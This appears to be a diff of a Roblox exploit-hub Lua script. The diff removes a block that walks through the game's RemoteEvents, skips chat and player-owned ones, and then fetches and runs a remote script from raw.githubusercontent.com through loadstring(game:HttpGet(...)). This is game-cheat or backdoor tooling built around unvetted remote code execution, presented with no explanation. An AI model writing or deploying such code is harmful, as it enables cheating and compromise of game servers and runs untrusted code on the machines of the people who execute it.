@@ -466,29 +466,3 @@ end)
 Settings:NewKeybind("Change Toggle Ui Keybind", "Change Toggle Ui Keybind", Enum.KeyCode.RightControl, function()
     library:ToggleUI()
 end)
-
-local localPlayer = game.Players.LocalPlayer
-
-local function a(rm)
-	local fullName =  rm:GetFullName()
-
-	if string.find(fullName, "DefaultChat") then return false end
-	if string.find(fullName, localPlayer.Name) then return false end
-	if rm:FindFirstChild("__FUNCTION") then return false end
-	if rm.Parent == game:GetService("JointsService") then return false end
-
-	if getgenv().blacklisted then
-		if table.find(getgenv().blacklisted, fullName) then return false end
-	end
-	return true
-	
-end
-
-for _, testRemote in pairs(game:GetDescendants()) do
-	if testRemote.ClassName == "RemoteEvent" then
-		if a(testRemote) then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/BlueDuck-jpg/CCHub/main/ccss.lua"))()
-		    break
-		end
-	end
-end
